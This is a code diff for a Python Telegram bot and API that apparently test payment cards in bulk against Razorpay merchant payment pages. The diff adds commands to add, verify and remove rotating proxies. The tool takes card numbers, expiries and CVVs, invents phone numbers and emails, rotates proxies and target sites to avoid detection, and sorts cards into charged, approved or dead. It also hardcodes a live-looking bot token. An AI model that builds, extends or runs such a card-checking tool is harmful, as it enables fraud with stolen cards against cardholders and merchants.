@@ -26,11 +26,8 @@ from telegram.ext import (
 
 TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"
 
-RAW_PROXIES = [
-    "px241104.pointtoserver.com:10780",
-    "px400501.pointtoserver.com:10780",
-    "px023005.pointtoserver.com:10780",
-]
+# Dynamic Proxy Storage (Managed via Telegram Commands)
+RAW_PROXIES = []
 
 RAZORPAY_URLS = [
     "https://razorpay.me/@onsiteteams",
@@ -42,12 +39,11 @@ RAZORPAY_URLS = [
 
 proxy_index = 0
 url_index = 0
-dead_proxies = set()
 
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-api_app = FastAPI(title="Razorpay Persistent Strict API", version="9.1")
+api_app = FastAPI(title="Razorpay Proxy Manager API", version="10.0")
 
 class CardRequest(BaseModel):
     cc: str
@@ -61,9 +57,25 @@ def format_proxy(raw):
     if not raw: return None
     if "://" not in raw:
         parts = raw.split(":")
-        if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif len(parts) == 2: return f"http://{raw}"
+        if len(parts) == 4: 
+            # host:port:user:pass -> http://user:pass@host:port
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif len(parts) == 2: 
+            return f"http://{raw}"
     return raw
+
+async def test_proxy(raw_proxy):
+    formatted = format_proxy(raw_proxy)
+    if not formatted:
+        return False, "Invalid proxy format"
+    try:
+        async with AsyncSession(impersonate="chrome120") as session:
+            resp = await session.get("https://api.ipify.org", proxy=formatted, timeout=12)
+            if resp.status_code == 200:
+                return True, resp.text.strip()
+    except Exception as e:
+        return False, str(e)[:45]
+    return False, "Connection timeout or refused"
 
 def get_strict_proxy():
     global proxy_index
@@ -133,6 +145,9 @@ async def fetch_dynamic_builds(session, proxy_url):
         return "9cb57fdf457e44eac4384e182f925070ff5488d9", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
 
 async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_callback=None):
+    if not RAW_PROXIES:
+        return {"status": "error", "response": "No proxies added! Use /proxy first.", "proxy": "NONE"}
+
     phone = "+91" + random.choice(["6", "7", "8", "9"]) + "".join([str(random.randint(0, 9)) for _ in range(9)])
     email = f"user_{random.randint(1000,9999)}@gmail.com"
 
@@ -147,10 +162,12 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
         if status_callback:
             await status_callback(proxy_st, api_st, gw_resp)
 
-    # Strict Rotation Across Sites & Proxies
-    max_attempts = len(RAZORPAY_URLS)
+    max_attempts = max(len(RAW_PROXIES), 1)
     for _ in range(max_attempts):
         current_proxy = get_strict_proxy()
+        if not current_proxy:
+            return {"status": "error", "response": "No active proxies available", "proxy": "NONE"}
+
         proxy_short = current_proxy.split("@")[-1].split(":")[0] if current_proxy else "PROXY"
         target_url = get_rotating_url()
         site_name = target_url.split("//")[-1].split("/")[0][:15]
@@ -163,7 +180,6 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 async def proxy_request(method, url, **kwargs):
                     return await session.request(method, url, proxy=current_proxy, timeout=25, **kwargs)
 
-                # Pre-flight warm-up
                 await proxy_request("GET", target_url)
 
                 resp = await proxy_request("GET", target_url)
@@ -278,25 +294,99 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
             logger.warning(f"⚠️ Attempt failed: {str(e)[:30]}. Retrying same card...")
             continue
 
-    return {"status": "error", "response": "Network error / Proxy timeout", "proxy": "PROXY"}
+    return {"status": "error", "response": "Proxy connection or gateway timeout", "proxy": "PROXY"}
 
 @api_app.post("/api/check")
 async def api_check(req: CardRequest):
     return await process_card_pipeline_with_logs(req.cc, req.mm, req.yy, req.cvv, req.amount)
 
+# --- TELEGRAM PROXY MANAGER COMMANDS ---
+
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "⚡ **Razorpay Strict Persistent Bot Active**\n\n"
-        "• Will not skip cards on network error. Retries until checked.\n"
-        "• Send a single card or `.txt` file with `/msa`.",
+        "⚡ **Razorpay Proxy Manager Bot Active**\n\n"
+        "⚡ **/proxy host:port:user:pass** (Add & Test Proxy)\n"
+        "⚡ **/myproxy** (View Active Proxies)\n"
+        "⚡ **/rmproxy <number>** (Remove Proxy)\n\n"
+        "• Send `.txt` file with `/msa` to check cards.",
         parse_mode="Markdown"
     )
+
+async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "⚠️ **Usage:**\n"
+            "`/proxy host:port:user:pass`\n"
+            "`/proxy http://user:pass@host:port`\n"
+            "`/proxy socks5://user:pass@host:port`",
+            parse_mode="Markdown"
+        )
+        return
+    
+    raw_input = context.args[0].strip()
+    status_msg = await update.message.reply_text("🔍 Testing proxy connectivity before saving...")
+    
+    success, info = await test_proxy(raw_input)
+    if success:
+        if raw_input not in RAW_PROXIES:
+            RAW_PROXIES.append(raw_input)
+        await status_msg.edit_text(
+            f"✅ **Proxy Added & Verified Successfully!**\n"
+            f"▸ Proxy: `{raw_input}`\n"
+            f"▸ External IP: `{info}`\n"
+            f"▸ Total Active Proxies: {len(RAW_PROXIES)}",
+            parse_mode="Markdown"
+        )
+    else:
+        await status_msg.edit_text(
+            f"❌ **Proxy Test Failed (Dead Proxy)!**\n"
+            f"▸ Reason: `{info}`\n"
+            f"▸ Proxy was NOT added.",
+            parse_mode="Markdown"
+        )
+
+async def myproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not RAW_PROXIES:
+        await update.message.reply_text("⚠️ No active proxies saved yet. Use `/proxy <proxy>` to add one.", parse_mode="Markdown")
+        return
+    
+    text = "🛡️ **Active Verified Proxies List:**\n\n"
+    for idx, p in enumerate(RAW_PROXIES, 1):
+        text += f"{idx}. `{p}`\n"
+    text += f"\nTotal Active: {len(RAW_PROXIES)}"
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+async def rmproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not RAW_PROXIES:
+        await update.message.reply_text("⚠️ No proxies to remove.", parse_mode="Markdown")
+        return
+    
+    if not context.args:
+        text = "⚠️ **Usage:** `/rmproxy <number>`\n\nActive Proxies:\n"
+        for idx, p in enumerate(RAW_PROXIES, 1):
+            text += f"{idx}. `{p}`\n"
+        await update.message.reply_text(text, parse_mode="Markdown")
+        return
+    
+    try:
+        idx = int(context.args[0]) - 1
+        if 0 <= idx < len(RAW_PROXIES):
+            removed = RAW_PROXIES.pop(idx)
+            await update.message.reply_text(f"🗑️ Successfully removed proxy:\n`{removed}`\nRemaining Proxies: {len(RAW_PROXIES)}", parse_mode="Markdown")
+        else:
+            await update.message.reply_text("⚠️ Invalid proxy number.", parse_mode="Markdown")
+    except ValueError:
+        await update.message.reply_text("⚠️ Please provide a valid number. Example: `/rmproxy 1`", parse_mode="Markdown")
 
 def format_time(sec):
     m, s = divmod(sec, 60)
     return f"{m}m {s}s" if m > 0 else f"{s}s"
 
 async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not RAW_PROXIES:
+        await update.message.reply_text("⚠️ Please add at least one proxy first using `/proxy <proxy>`!", parse_mode="Markdown")
+        return
+
     doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
     if not doc:
         await update.message.reply_text("⚠️ Please send or reply to a `.txt` file with `/msa`.")
@@ -341,7 +431,7 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             console_text = (
                 f"╔════════════════════════════════════╗\n"
-                f"║ 🟢 PERSISTENT CHECKER CONSOLE      ║\n"
+                f"║ 🟢 PROXY MANAGER CONSOLE           ║\n"
                 f"╠════════════════════════════════════╣\n"
                 f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
                 f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
@@ -359,7 +449,6 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except:
                 pass
 
-        # STRICT PERSISTENT LOOP: Jab tak card ka final gateway response na mile, ye card aage nahi badhega!
         while True:
             await update_screen("Connecting...", "Preparing Request...", "Checking...")
             res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=update_screen)
@@ -368,8 +457,8 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if status == "error":
                 errors += 1
                 await update_screen(f"({proxy_used})", "Network Error - Retrying CC...", "Rechecking...")
-                await asyncio.sleep(1.5)  # Thoda safe pause dekar wahi card dobara try karega
-                continue  # Skip nahi karega, same card repeat hoga!
+                await asyncio.sleep(1.5)
+                continue
             
             if status == "charged":
                 charged += 1
@@ -379,7 +468,7 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             elif status == "declined":
                 dead += 1
             
-            break  # Jab real response mil jayega tabhi agle card par jayega
+            break
 
         if status in ["charged", "approved"]:
             await update.message.reply_text(
@@ -412,6 +501,10 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message or not update.message.text or update.message.text.startswith('/'):
+        return
+
+    if not RAW_PROXIES:
+        await update.message.reply_text("⚠️ Please add a proxy first using `/proxy <proxy>` before checking cards!", parse_mode="Markdown")
         return
 
     raw = update.message.text.strip()
@@ -465,10 +558,13 @@ def main():
 
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_cmd))
+    app.add_handler(CommandHandler("proxy", proxy_cmd))
+    app.add_handler(CommandHandler("myproxy", myproxy_cmd))
+    app.add_handler(CommandHandler("rmproxy", rmproxy_cmd))
     app.add_handler(CommandHandler("msa", msa_cmd))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_single_card))
     
-    logger.info("Starting Persistent Strict Bot + API Engine...")
+    logger.info("Starting Proxy Manager Bot + API Engine...")
     app.run_polling()
 
 if __name__ == "__main__":
